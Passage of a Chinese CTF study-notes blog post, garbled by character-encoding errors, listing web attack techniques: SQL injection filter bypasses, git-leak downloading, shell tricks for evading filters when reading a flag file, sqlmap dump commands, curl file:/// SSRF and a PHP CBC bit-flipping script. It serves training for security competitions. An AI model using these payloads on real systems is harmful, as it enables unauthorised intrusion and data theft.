é€šè¿‡å°†æ­£å¸¸çš„XMLè·¯å¾„ä¿®æ”¹ä¸ºä¸ç¬¦åˆè¯­æ³•çš„è·¯å¾„å³å¯ä½¿å…¶æŠ¥é”™å¹¶æ˜¾ç¤ºé”™è¯¯å†…å®¹ï¼Œå¦‚ä¸‹é¢è¿™åˆ™æŸ¥è¯¢ï¼š</p><p>  <code>select username from security.user where id=1 and (extractvalue(â€˜anythingâ€™,concat(â€˜~â€™,(select database()))))</code></p><p>  ä¼šè¿”å›ï¼š<code>error 1105 : XPATH syntax error: &#39;~database_name&#39;</code>ï¼Œå³ <code>~</code> ä¸åº“åç»„æˆçš„å­—æ®µ</p></li><li><p>è¿‡æ»¤å¼•å·ï¼šè½¬hexï¼Œå¦‚admin =&gt; hex{61 64 6d 69 6e}</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">select * from users where uname &#x3D; 0x61646d696e;</span><br><span class="line">        #+-------+----------+</span><br><span class="line">        #| uname | passwd   |</span><br><span class="line">        #+-------+----------+</span><br><span class="line">        #| admin | adpasswd |</span><br><span class="line">        #+-------+----------+</span><br></pre></td></tr></table></figure></li><li><p>è¿‡æ»¤ç©ºæ ¼ï¼š<code>/**/</code>ï¼Œ<code>()</code>ï¼Œ<code>%0a</code>ï¼Œ<code>`</code></p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select&#x2F;**&#x2F;*&#x2F;**&#x2F;from&#x2F;**&#x2F;users;</span><br><span class="line">select(id)from(users);#æ³¨æ„*ä¸èƒ½åœ¨ç©ºæ ¼å†…</span><br><span class="line">select&#96;id&#96;from&#96;users&#96;where&#96;id&#96;&#x3D;1;</span><br></pre></td></tr></table></figure></li><li><p>è¿‡æ»¤é€»è¾‘è¿ç®—ç¬¦ï¼š<code>and = &amp;&amp;</code>ï¼Œ<code>or = ||</code>ï¼Œ<code>xor = |</code>ï¼Œ<code>not = !</code></p></li><li><p>è¿‡æ»¤ç­‰å·ï¼š</p><ul><li><p><code>like</code>ï¼šä¸åŠ é€šé…ç¬¦%çš„likeä¸ç­‰äºç­‰æ•ˆ</p>  <center><code>select * from users where uname like 'admin';</code></center></li><li><p><code>rlike</code>ï¼šæ¨¡ç³ŠåŒ¹é…ï¼Œæœç´¢å­—æ®µä¸­å­˜åœ¨çš„éƒ¨åˆ†ï¼Œåˆ™æ‰€æœ‰åŒ…å«æœç´¢å†…å®¹çš„å­—æ®µå‡ä¼šè¢«é€‰ä¸­</p>  <center><code>select * from users where uname rlike 'admin';</code></center></li><li><p><code>regexp</code>ï¼šæ­£åˆ™åŒ¹é…</p>  <center><code>select * from users where uname regexp 'admin';</code></center></li><li><p>å¤¹é€¼ï¼š</p>  <center><code>select * from users where id>0 and id<2;</code></center></li><li><p><code>!(...&lt;&gt;...)</code>ï¼šåŒé‡å¦å®šè¡¨è‚¯å®š</p>  <center><code>select * from users where !(uname<>'admin');</code></center></li><li><p>strcmp(str1,str2)ï¼šå­—ç¬¦ä¸²ç›¸åŒè¿”å›0ï¼Œä¸åŒè¿”å›1æˆ–-1</p></li></ul>  <center><code>strcmp(ascii(substr(uname,1,1)),100)</code></center><ul><li>inï¼š</li></ul>  <center><code>substr(username,1,1) in ('a')</code></center><ul><li>between â€¦ and â€¦ï¼š</li></ul>  <center><code>substr(username,1,1) between 'a' and 'a'</code></center></li><li><p>è¿‡æ»¤é€—å·ï¼š</p><ul><li><p>å¯¹äºsubstr()ï¼Œmid()ç­‰å­—ç¬¦å¤„ç†å‡½æ•°å¯ç”¨<code>from pos for len</code>ï¼šä»<code>pos</code>å¼€å§‹è¯»<code>len</code>ä¸ªå­—ç¬¦ï¼Œç”¨æ³•ä¸º<code>substr(&#39;HelloWorld&#39; from 2 for 5)</code></p></li><li><p>å¯¹äºéœ€è¦<code>union select</code>åˆ°çš„æ´¾ç”Ÿè¡¨ï¼Œå¯ä»¥ç”¨<code>join</code>ä»£æ›¿é€—å·æ¥éš”å¼€ï¼›æ³¨æ„æ´¾ç”Ÿè¡¨éœ€è¦å¯¹å…¶å®šä¹‰ä¸€ä¸ªä¸´æ—¶è¡¨å</p>  <center><code>select 1ï¼Œ2ï¼Œ3;</code></center>  <center>ç­‰ä»·äº</center>  <center><code>select * from (select 1)a join (select 2)b join(select 3)c;</code></center></li></ul></li><li><p>è¿‡æ»¤éƒ¨åˆ†å‡½æ•°ï¼š</p><ul><li><p>sleep() â€“&gt;benchmark()ï¼šbenchmark()ç”¨äºæµ‹è¯•æŸäº›ç‰¹å®šæ“ä½œçš„æ‰§è¡Œé€Ÿåº¦ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ‰§è¡Œæ¬¡æ•°ï¼Œç¬¬äºŒä¸ªæ˜¯æ‰§è¡Œçš„è¡¨è¾¾å¼</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">select 1 and benchmark(500000000,1);</span><br><span class="line">        #+------------------------------+</span><br><span class="line">        #| 1 and benchmark(500000000,1) |</span><br><span class="line">        #+------------------------------+</span><br><span class="line">        #|                            0 |</span><br><span class="line">        #+------------------------------+</span><br><span class="line">        #1 row in set (1.49 sec)</span><br></pre></td></tr></table></figure></li><li><p>ascii()â€“&gt;hex()ã€bin()</p></li><li><p>group_concat()â€“&gt;concat_ws()</p></li><li><p>ascii()â€“&gt;ord()ï¼šè¿™ä¸¤ä¸ªå‡½æ•°åœ¨å¤„ç†è‹±æ–‡æ—¶æ•ˆæœä¸€æ ·ï¼Œä½†æ˜¯å¤„ç†ä¸­æ–‡ç­‰æ—¶ä¸ä¸€è‡´</p></li></ul></li></ul><hr><h1 id="webæ¡†æ¶"><a href="#webæ¡†æ¶" class="headerlink" title="webæ¡†æ¶"></a><big><center>webæ¡†æ¶</center></big></h1><h2 id="pythonæ¡†æ¶"><a href="#pythonæ¡†æ¶" class="headerlink" title="pythonæ¡†æ¶"></a>pythonæ¡†æ¶</h2><p><code>os.environ</code>ï¼špythonçš„ç¯å¢ƒå˜é‡ï¼Œå¯èƒ½ä¼šåœ¨é‡Œé¢éšè—ä¿¡æ¯ï¼Œæœ¬ä½“æ˜¯ä¸€ä¸ªæ–‡ä»¶ï¼Œç»å¯¹åœ°å€ä¸º <code>/proc/self/environ</code></p><p><code>pickle</code>ï¼šç”¨äºåºåˆ—åŒ–çš„åº“ï¼Œåºåˆ—åŒ–ï¼š<code>pickle.dumps(obj)</code>ï¼Œååºåˆ—åŒ–ï¼š<code>pickle.loads(str)</code>ï¼ˆç›´æ¥dumpã€loadï¼Œå³ä¸åŠ  s æ—¶ï¼Œæ˜¯å°†åºåˆ—åŒ–åçš„æ–‡æœ¬å‚¨å­˜åˆ°æ–‡ä»¶ä¸­ï¼‰</p><h3 id="flask"><a href="#flask" class="headerlink" title="flask"></a>flask</h3><h3 id="tornado"><a href="#tornado" class="headerlink" title="tornado"></a>tornado</h3><h2 id="PHPæ¡†æ¶"><a href="#PHPæ¡†æ¶" class="headerlink" title="PHPæ¡†æ¶"></a>PHPæ¡†æ¶</h2><h3 id="FatFreeFramework"><a href="#FatFreeFramework" class="headerlink" title="FatFreeFramework"></a>FatFreeFramework</h3><hr><h1 id="git"><a href="#git" class="headerlink" title="git"></a><big><center>git</center></big></h1><h2 id="gitåŸºç¡€"><a href="#gitåŸºç¡€" class="headerlink" title="gitåŸºç¡€"></a><big>gitåŸºç¡€</big></h2><p>HEADï¼šæŒ‡å‘ä½ æ­£åœ¨å·¥ä½œä¸­çš„æœ¬åœ°åˆ†æ”¯çš„æŒ‡é’ˆï¼Œå¯ä»¥å°†HEADæƒ³è±¡ä¸ºå½“å‰åˆ†æ”¯çš„åˆ«å</p><p>git reflogï¼šæŸ¥çœ‹å¼•ç”¨æ—¥å¿—ï¼Œè®°å½•åˆ†æ”¯å’ŒHEADæŒ‡å‘çš„å†å²ï¼Œè¿™äº›æ—¥å¿—å¯ä»¥è¢«åˆ é™¤ï¼Œå¹¶éç¡¬æ€§</p><p>CommitIDï¼šreflogä¸­ä¼šè®°å½•æäº¤ IDï¼Œä½œä¸ºresetçš„å‚æ•°å¯ä»¥é€€å›åˆ°æŒ‡å®šçš„æäº¤å¤„</p><p>git checkout â€“ file_path_nameï¼šç”¨äºæ”¾å¼ƒå•ä¸ªæ–‡ä»¶çš„ä¿®æ”¹ï¼Œæ³¨æ„ â€“ä¸¤è¾¹æœ‰ç©ºæ ¼</p><p>git reset [â€“hard|soft|mixed|merge|keep] [commit|HEAD]ï¼šå°†å½“å‰åˆ†æ”¯é‡è®¾åˆ°æŒ‡å®šçš„</p><p>HEAD^ï¼šé€€å›ä¸€ä¸ªå¿«ç…§ï¼Œ^æ•°é‡è¡¨ç¤ºé€€å›çš„æ­¥æ•°</p><p>git status [-s]ï¼šå‘½ä»¤ç”¨äºæŸ¥çœ‹åœ¨ä½ ä¸Šæ¬¡æäº¤ä¹‹åæ˜¯å¦æœ‰å¯¹æ–‡ä»¶è¿›è¡Œå†æ¬¡ä¿®æ”¹ï¼Œ-sè¡¨ç®€çŸ­</p><p><img src="/images/git%E6%8C%87%E4%BB%A4%E5%8F%AF%E8%A7%86%E5%8C%96.png"></p><center style="color:#C0C0C0;text-decoration:underline">å¯¹åº”çš„Gitæµç¨‹åŒºåŸŸåˆ†åˆ«ä¸º    å·¥ä½œåŒº / ç¼“å­˜åŒº / æäº¤å†å²</center><h2 id="gitæ³„æ¼"><a href="#gitæ³„æ¼" class="headerlink" title="gitæ³„æ¼"></a><big>gitæ³„æ¼</big></h2><p>åœ¨ç½‘é¡µæ›´æ–°ï¼Œä¸Šä¼ è¿‡ç¨‹ä¸­ç”±äºæ“ä½œå¤±è¯¯å¯èƒ½å¯¼è‡´ gitæ³„æ¼</p><p>ç‰¹å¾ï¼š/.gitå¯ä»¥è®¿é—®ï¼Œæˆ–é—ç•™äº† .swpï¼Œ.php.bakï¼Œ.php~ ç­‰å¤‡ä»½æ–‡ä»¶</p><p>å¯¹äº /.gitå¯ä»¥è®¿é—®çš„é¡µé¢ï¼Œå°è¯•ç”¨ GitHackæˆ– Linuxä¸­ wgetå‘½ä»¤ä¸‹è½½ .gitæ–‡ä»¶å¤¹</p><p>GitHackä¾èµ–Python2.7ç¯å¢ƒï¼š<code>python2 githack.py address/.git/</code></p><p>-rå‚æ•°ä¸ºé€’å½’ä¸‹è½½ï¼Œæ•´ç«™çˆ¬å–ï¼š<code>wget -r address/.git</code></p><hr><h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a><big><center>Linux</center></big></h1><h2 id="LinuxåŸºç¡€"><a href="#LinuxåŸºç¡€" class="headerlink" title="LinuxåŸºç¡€"></a><big>LinuxåŸºç¡€</big></h2><p>pwdï¼šæ˜¾ç¤ºå½“å‰ç›®å½•</p><p>dir ä¸ lsï¼šæ˜¾ç¤ºæŒ‡å®šç›®å½•å†…å®¹ï¼Œé»˜è®¤ä¸ºå½“å‰ç›®å½•</p><p>wgetï¼šä¸‹è½½å‘½ä»¤ï¼Œå…¶ä¸­ -rå‚æ•°ä¸ºé€’å½’ä¸‹è½½ï¼Œç›¸å½“äºæ•´ç«™ä¸‹è½½</p><p>æµè§ˆæ–‡ä»¶ï¼š</p><ul><li><p>catï¼šè¿æ¥æ–‡ä»¶å¹¶æ‰“å°</p></li><li><p>tacï¼šè¿æ¥æ–‡ä»¶ï¼Œå€’åºæ‰“å°</p></li><li><p>nlï¼šé“¾æ¥æ–‡ä»¶å¹¶å¸¦è¡Œå·æ‰“å°</p></li><li><p>headï¼šè¿æ¥æ–‡ä»¶ï¼Œæ‰“å°å¼€å¤´å‡ è¡Œ</p></li><li><p>tailï¼šè¿æ¥æ–‡ä»¶ï¼Œæ‰“å°æœ€åå‡ è¡Œ</p></li><li><p>moreï¼šé€é¡µæ˜¾ç¤ºå†…å®¹ï¼Œä¾¿äºé˜…è¯»ï¼Œè‡ªå¸¦ +/string æœç´¢åŠŸèƒ½ï¼Œå½“ string æ˜¯ int æ—¶ä¼šä»é‚£ä¸€è¡Œå¼€å§‹æ˜¾ç¤º</p></li><li><p>lessï¼šç›®å‰ç†è§£ä¸ºæ›´é«˜çº§çš„ more</p></li></ul><p>chmod u+xï¼šæå‡æ–‡ä»¶æƒé™ï¼Œå½“å‡ºç° zsh permission æƒé™ä½æ—¶å¯ç”¨</p><p>grepï¼šæŸ¥æ‰¾æ–‡ä»¶é‡Œç¬¦åˆæ¡ä»¶çš„å­—ç¬¦ä¸²ï¼ˆå¯æ­£åˆ™ï¼‰ï¼Œå…¨ç§° Global Regular Expression Printï¼Œå¯ç›´æ¥å¯¹æ–‡ä»¶å†…å®¹è¿›è¡Œæœç´¢ï¼Œå¦‚åœ¨â€™/usr/src/Linux/Docâ€™ç›®å½•ä¸‹æœç´¢å¸¦å­—ç¬¦ ä¸²â€™magicâ€™çš„æ–‡ä»¶ï¼š<code>grep magic /usr/src/Linux/Doc/*</code></p><p>../ ä¸ ./ï¼šçˆ¶çº§ç›®å½•ä¸å½“å‰ç›®å½•</p><p>&gt;ï¼šé‡å®šå‘è¾“å‡ºï¼Œè¦†ç›–åŸæœ‰å†…å®¹ï¼Œ<code>echo 'this is flag' > flag.txt</code> #è‹¥flag.txtä¸å­˜åœ¨ï¼Œåˆ™åˆ›å»ºï¼›è‹¥å­˜åœ¨ï¼Œåˆ™è¦†ç›–</p><p>&gt;&gt;ï¼šé‡å®šå‘è¾“å‡ºï¼Œè¿½åŠ æ–°å†…å®¹</p><p>&lt;ï¼šä»æ–‡ä»¶ä¸­è·å–è¾“å…¥</p><p>|ï¼šç®¡é“ (pipe)ï¼Œä»¥ä¸Šä¸€æ¡å‘½ä»¤çš„è¾“å‡ºä½œä¸ºä¸‹ä¸€æ¡å‘½ä»¤çš„å‚æ•°æˆ–è¾“å…¥</p><p>||ï¼šä¸Šä¸€æ¡å‘½ä»¤æ‰§è¡Œå¤±è´¥åæ‰æ‰§è¡Œä¸‹ä¸€æ¡å‘½ä»¤</p><p>&amp;&amp;ï¼šä¸Šä¸€æ¡å‘½ä»¤æ‰§è¡ŒæˆåŠŸåæ‰æ‰§è¡Œä¸‹ä¸€æ¡å‘½ä»¤</p><p>?ï¼šé€šé…ç¬¦ï¼ŒåŒ¹é…ä»»æ„å•ä¸ªå­—ç¬¦</p><p>$ï¼šå£°æ˜å˜é‡</p><h2 id="â€èŠ±å¼catFlagâ€"><a href="#â€èŠ±å¼catFlagâ€" class="headerlink" title="â€èŠ±å¼catFlagâ€"></a><big>â€èŠ±å¼catFlagâ€</big></h2><ul><li><p>è¿‡æ»¤ç©ºæ ¼ï¼š<code>\&lt;</code>ï¼Œ<code>\&gt;</code>ï¼Œ<code>\&lt;/</code>ï¼Œ<code>&#123; , &#125;</code>ï¼Œ<code>\$&#123;IFS&#125;</code>ï¼Œ<code>\$IFS\$1</code> - [æ•°å­—éšæ„]</p>  <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cat flag.txt</span><br><span class="line"><span class="meta">cat$</span><span class="bash">&#123;IFS&#125;flag.txt</span></span><br><span class="line"><span class="meta">cat$</span><span class="bash">IFS<span class="variable">$9flag</span>.txt</span></span><br><span class="line">cat&lt;flag.txt</span><br><span class="line">cat&lt;&gt;flag.txt</span><br><span class="line">&#123;cat,flag.txt&#125;</span><br></pre></td></tr></table></figure></li><li><p>å †å ï¼šå½“åªæœ‰ä¸€ä¸ªè¯­å¥çš„æ—¶å€™ï¼Œæœ«å°¾æ— éœ€åˆ†å·ï¼Œæœ€åä¸€ä¸ªè¯­å¥åé¢ä¹Ÿæ— éœ€åˆ†å·</p></li><li><p>å˜é‡æ‹¼æ¥ [å‰ææ˜¯å¯ä»¥å †å ]ï¼šå¦‚ä¸‹åˆ—ä»£ç å¯¹<code>flag</code>è´ªå©ªåŒ¹é…</p>  <center><code>preg_match("/.*f.*l.*a.*g.*/", $input)</code></center>  <center>å¯¹ â†“ ç­–</center>  <center><code>$inputï¼ša=ag;b=fl;cat $b$a</code></center></li><li><p>shå‘½ä»¤æ‰§è¡Œï¼š<code>echo YourShell|sh</code></p></li><li><p>b64ç¼–ç ï¼š<code>echo YourB64|base64 -d</code></p></li><li><p>å‘½ä»¤æ›¿æ¢ï¼šåå¼•å· <code>``</code> æ¡†é€‰çš„å†…å®¹åœ¨å‘½ä»¤ä¸­ä¼˜å…ˆæ‰§è¡Œï¼Œæ‰§è¡Œç»“æœè¿”å›åˆ°åŸæœ¬åå¼•å·çš„ä½ç½®è¿›è¡Œæ›¿æ¢ï¼Œä¾‹å¦‚<code>cat &#96;ls&#96;</code>ä¼šå…ˆ lsï¼Œè¿”å›å½“å‰ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶åï¼Œç„¶å cat ä¼šæŠŠæ‰€æœ‰æ–‡ä»¶é€ä¸€è¿æ¥ã€æ‰“å°</p></li></ul><hr><h1 id="Tool"><a href="#Tool" class="headerlink" title="Tool"></a><big><center>Tool</center></big></h1><h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a><big>sqlmap</big></h2><p>å…¨è‡ªåŠ¨ SQLæ‰«æå·¥å…·ï¼Œ<code>--batch</code> ä¸€é”®å¼€å¯å…¨è‡ªåŠ¨æ¨¡å¼</p><ul><li>æ³¨å…¥æ£€æµ‹<ul><li><code>-u url</code>â€”â€”æ£€æŸ¥GETå‚æ•°æ³¨å…¥ç‚¹</li><li><code>-u url -data="id=1"</code>â€”â€”æ£€æŸ¥POSTå‚æ•°æ³¨å…¥ç‚¹</li><li><code>-u url -H 'header=*'</code>â€”â€”æ£€æŸ¥HEADERæ³¨å…¥ï¼Œæ˜Ÿå·è¡¨ç¤ºæ‰‹åŠ¨æ ‡è®°æ³¨å…¥ç‚¹</li></ul></li><li>è¡¨å•çˆ†ç ´<ul><li><code>-dbs</code>â€”â€”æŸ¥çœ‹æ•°æ®åº“</li><li><code>-D database_name --tables</code>â€”â€”æŸ¥çœ‹è¡¨å</li><li><code>-D database_name -T table_name --columns</code>â€”â€”æŸ¥çœ‹åˆ—å</li><li><code>-D database_name -T table_name -C col1,col2... --dump</code>â€”â€”æŸ¥çœ‹åˆ—å†…å®¹</li></ul></li></ul><h2 id="cURL"><a href="#cURL" class="headerlink" title="cURL"></a><big>cURL</big></h2><p>åˆ©ç”¨ URLè¯­æ³•åœ¨å‘½ä»¤è¡Œä¸‹å·¥ä½œçš„æ–‡ä»¶ä¼ è¾“å·¥å…·ï¼ŒWindowsè‡ªå¸¦ï¼ŒGETï¼ŒPOSTï¼ŒHEADERSç­‰ curléƒ½æ”¯æŒï¼Œå’Œpythonä¸­çš„requestså·®ä¸å¤š<code>curl baidu.com</code>ï¼Œè¯¦æƒ…å¯ä»¥ curl â€“help</p><p>ä¹Ÿå¯ä»¥è®¿é—®æœ¬åœ°æ–‡ä»¶ï¼š<code>curl file:///MyPhoto.png</code></p><p>è¿˜å¯ä»¥ä¸€è¡Œå‘½ä»¤ï¼Œå¤šä¸ªè®¿é—®ï¼š<code>curl baidu.com google.com</code></p><p>å½“æœåŠ¡ç«¯è‡ªèº«ä½¿ç”¨ curlå‘é€ GETè¯·æ±‚ï¼Œä¸” GETå†…å®¹å¯æ§æ—¶ï¼Œå¯ä»¥è·å–æœåŠ¡ç«¯æœ¬åœ° flag</p><p>æœåŠ¡ç«¯çš„æƒ…å†µï¼š<code>curl address.com/?key=$_GET['key']</code></p><p>åˆ©ç”¨å¤šä¸ªè®¿é—®ä¸æœ¬åœ°è®¿é—®ï¼Œä¼ å‚ä¸ºï¼š<code>server.com/?key=anything file:///flag</code></p><h2 id="pipæŒ‡å®šç‰ˆæœ¬çš„åŒ…"><a href="#pipæŒ‡å®šç‰ˆæœ¬çš„åŒ…" class="headerlink" title="pipæŒ‡å®šç‰ˆæœ¬çš„åŒ…"></a><big>pipæŒ‡å®šç‰ˆæœ¬çš„åŒ…</big></h2><p><code>pip install lib==version</code></p><hr><h1 id="ENCRYPT"><a href="#ENCRYPT" class="headerlink" title="ENCRYPT"></a><big><center>ENCRYPT</center></big></h1><h2 id="CBCå­—ç¬¦ç¿»è½¬æ”»å‡»"><a href="#CBCå­—ç¬¦ç¿»è½¬æ”»å‡»" class="headerlink" title="CBCå­—ç¬¦ç¿»è½¬æ”»å‡»"></a><big>CBCå­—ç¬¦ç¿»è½¬æ”»å‡»</big></h2><p align='right'><small>è¿˜ä¸å¤ªæ‡‚ï¼Œæš‚å…ˆæ”¶å½•</small></p><p><a href="https://blog.csdn.net/u013577244/article/details/86310881?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-3.not_use_machine_learn_pai&depth_1-utm_source=distribute.pc_relevant.no">CSDNç›¸å…³æ–‡ç« </a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">header(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="comment">#è®¡ç®—cipher</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">æ˜æ–‡1ï¼ša:2:&#123;s:8:&quot;userna//r</span></span><br><span class="line"><span class="comment">æ˜æ–‡2ï¼šme&quot;;s:5:&quot;admil&quot;;//lå­—æ¯åœ¨ç¬¬14ä¸ªå­—èŠ‚</span></span><br><span class="line"><span class="comment">æ˜æ–‡3ï¼šs:8:&quot;password&quot;;s</span></span><br><span class="line"><span class="comment">æ˜æ–‡4ï¼š:3:&quot;123&quot;;&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="variable">$cipher</span>=base64_decode(urldecode(<span class="string">&#x27;f0csYAAWDy%2FGlSsvWLr6NlCBad4p2U%2BXm2Rr2X07iytKd4r8V5tbO7%2FcxIib96eRDGUOMQclQgvxw2SZXOobWQ%3D%3D&#x27;</span>));</span><br><span class="line"><span class="variable">$temp</span>=<span class="variable">$cipher</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">è®¾å¯†æ–‡1[13]=A,è§£å¯†(å¯†æ–‡2)[13]=B,æ˜æ–‡2[13]=C,</span></span><br><span class="line"><span class="comment">å°†Aä¿®æ”¹ä¸ºA ^ C,åˆ™:</span></span><br><span class="line"><span class="comment">A ^ B = A ^ C ^ B = B ^ B = 0 = C</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//A  C X</span></span><br><span class="line"><span class="variable">$cipher</span>[<span class="number">13</span>]=chr(ord(<span class="variable">$cipher</span>[<span class="number">13</span>]) ^ ord(<span class="string">&#x27;l&#x27;</span>) ^ ord(<span class="string">&#x27;n&#x27;</span>));</span><br><span class="line"><span class="keyword">echo</span> urlencode(base64_encode(<span class="variable">$cipher</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">#è®¡ç®—iv</span></span><br><span class="line"><span class="variable">$res</span>=base64_decode(<span class="string">&#x27;yeiydaYLG5RNzOPWaQgOkG1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjM6IjEyMyI7fQ==&#x27;</span>);<span class="comment">//è¿™é‡Œæ”¾burpæ”¾å›çš„base64æ•°æ®</span></span><br><span class="line"><span class="variable">$iv</span>=base64_decode(urldecode(<span class="string">&#x27;TD9FI%2FvbrZn%2FSjbSD9bfSQ%3D%3D&#x27;</span>)); <span class="comment">//è¿™é‡Œæ”¾cookieä¸­çš„iv</span></span><br><span class="line"><span class="variable">$plaintext</span>=<span class="string">&#x27;a:2:&#123;s:8:&quot;userna&#x27;</span>;</span><br><span class="line"><span class="variable">$new_iv</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">16</span>; <span class="variable">$i</span> ++)&#123;</span><br><span class="line">    <span class="variable">$new_iv</span>=<span class="variable">$new_iv</span>.chr(ord(<span class="variable">$iv</span>[<span class="variable">$i</span>])^ord(<span class="variable">$res</span>[<span class="variable">$i</span>])^ord(<span class="variable">$plaintext</span>[<span class="variable">$i</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> urlencode(base64_encode(<span class="variable">$new_iv</span>));</span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
